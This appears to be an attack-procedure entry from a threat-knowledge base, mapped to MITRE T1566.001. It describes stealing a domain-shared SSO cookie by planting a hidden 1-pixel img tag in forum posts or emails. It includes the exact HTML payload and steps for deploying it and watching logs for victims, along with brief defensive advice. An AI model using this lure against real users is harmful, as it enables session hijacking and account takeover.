---
id: proc-lure-victim
tags:
  - phishing
  - social-engineering
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Phishing]]'
updated_at: '2025-12-14T04:38:39.642Z'
sub_techniques:
  - '[[T1566.001]]'
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Phishing]]'
---
# Lure Victim to Access Malicious Subdomain

## Summary

This procedure uses phishing techniques like hidden image tags in forum posts or emails to induce victims to request content from the malicious subdomain, automatically leaking domain-shared cookies.

## Description

In the attack, a hidden IMG tag in a community.ubnt.com reply sourced an image from ping.ubnt.com, causing the browser to include the UBIC_AUTH cookie due to the .ubnt.com domain attribute.

## Requirements

1. Access to victim-interactable platforms (e.g., forums, email)
2. Controlled malicious subdomain
3. Knowledge of victim's SSO usage

## Defense

Defensive measures and detection strategies:

- Set HttpOnly and Secure flags on cookies; use SameSite=Strict to prevent cross-site sends
- Monitor for anomalous requests to subdomains from internal posts

## Objectives

1. Trigger automatic browser request without user suspicion
2. Exploit domain-wide cookie sharing
3. Ensure high success rate via passive lures

## Instructions

### Step 1: Craft Lure Payload

**Context**: Create non-intrusive HTML to fetch from the subdomain.

**Instructions**: Embed <img src="https://ping.ubnt.com/imagefetch.php?f=thanks.png" style="display:none;" width="1" height="1"> in a forum post or email signature.

### Step 2: Deploy Lure

**Context**: Place the lure where victims will load it (e.g., community reply).

**Instructions**: Post on community.ubnt.com targeting active users. Alternatives: HTML emails or injected ads.

### Step 3: Monitor Trigger

**Context**: Watch for incoming requests indicating victim access.

**Instructions**: Check server logs for GET requests to imagefetch.php with User-Agent matching victim browsers.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Phishing]]

### Sub-Techniques

- [[T1566.001]]

## Commands Used


## Tools Used


## Tags

- [[Phishing]]
- [[social-engineering]]
